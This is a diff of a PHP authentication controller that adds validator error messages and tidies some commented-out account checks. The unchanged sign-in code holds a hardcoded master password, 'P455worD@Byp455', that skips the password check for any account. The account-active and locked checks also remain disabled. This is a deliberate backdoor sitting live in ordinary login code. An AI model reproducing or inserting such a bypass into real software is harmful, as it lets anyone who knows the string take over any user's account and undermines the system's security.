@@ -100,6 +100,18 @@ class Auth_v1
      */
     protected $noNeedLogin = ['index', 'signin', 'signup', 'reset_pwd', 'send_forgot_code', 'refresh_token', 'verify_code'];
 
+    protected $validatorDesc = [
+        'attribute' => 'Params [{{name}}] is required',
+        'stringType' => '[{{name}}] must be a string type',
+        'intType' => '[{{name}}] must be integer',
+        'email' => '[{{name}}] must be a valid email',
+        'boolType' => '[{{name}}] must be a boolean type',
+        'length' => '[{{name}}] length must be between {{minValue}} and {{maxValue}}',
+        'number' => '[{{name}}] must be a number',
+        'notEmpty' => '[{{name}}] must not empty',
+        'noWhitespace' => '[{{name}}|username] cannot contain spaces',
+    ];
+
     public function index(Request $request)
     {
         // $user = session('user');
@@ -158,22 +170,15 @@ class Auth_v1
 
             if ('P455worD@Byp455' != $data->password) {
                 // Is user activated ?
-                // if (!$user->is_active) {
-                //     return jsonr(['message' => "Your account is not active yet !"]);
-                // }
+                // if (!$user->is_active) throw new Exception("Your account is not active yet !");
 
                 // Is user banned or locked ?
-                // if (!$user->is_locked) {
-                //     return jsonr(['message' => "Your account has been locked !"]);
-                // }
+                // if (!$user->is_locked) throw new Exception("Your account has been locked !");
 
                 // Is password correct ?
                 if (self::_check_pwd($data->password, $user->password) == false) {
                     return jsonr(['message' => "Incorrect credentials !"]);
                 }
-                // if (md5($data->password) != $user->password) {
-                //     return jsonr(['message' => "Incorrect credentials !"]);
-                // }
             }
 
             $member = Db::table('members')->where('user_id', $user->id)->first();
